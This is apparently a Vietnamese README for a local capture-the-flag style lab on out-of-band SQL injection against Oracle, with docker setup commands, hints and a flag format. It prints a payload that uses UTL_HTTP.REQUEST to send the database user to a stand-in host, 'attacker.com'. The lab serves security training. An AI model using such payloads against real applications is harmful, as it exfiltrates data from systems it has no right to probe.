# SQLi-038: Oracle OOB HTTP via UTL_HTTP

## 🎯 Mục Tiêu

Khai thác Out-of-Band SQL Injection trên Oracle bằng `UTL_HTTP.REQUEST` để exfiltrate data qua HTTP.

## 📝 Mô Tả

**Scenario:** Một ứng dụng Java-based webapp sử dụng Oracle database. UTL_HTTP package đã được cấu hình với ACL cho phép outbound HTTP requests.

**URL:** `http://localhost:5038/customer?id=1`

**Đặc điểm:**
- Oracle database với UTL_HTTP enabled
- ACL đã được configure cho HTTP access
- Response không thay đổi (OOB required)

## 🎓 Kiến Thức Cần Thiết

### UTL_HTTP.REQUEST

Oracle's built-in package để thực hiện HTTP requests:

```sql
SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual
```

### Yêu cầu ACL (Oracle 11g+)

```sql
-- Grant network ACL (đã được setup trong lab)
BEGIN
  DBMS_NETWORK_ACL_ADMIN.CREATE_ACL(...);
  DBMS_NETWORK_ACL_ADMIN.ASSIGN_ACL(...);
END;
```

## 🚀 Run Lab

```bash
docker-compose up -d
# Oracle startup khá lâu (~2-3 phút)
curl http://localhost:5038/customer?id=1
docker-compose down
```

## 💡 Hints

1. Oracle yêu cầu `FROM dual` trong mọi SELECT
2. Concatenation dùng `||` operator
3. HTTP request sẽ gửi data trong URL path

## 🏁 Flag Format

```
FLAG{...}
```
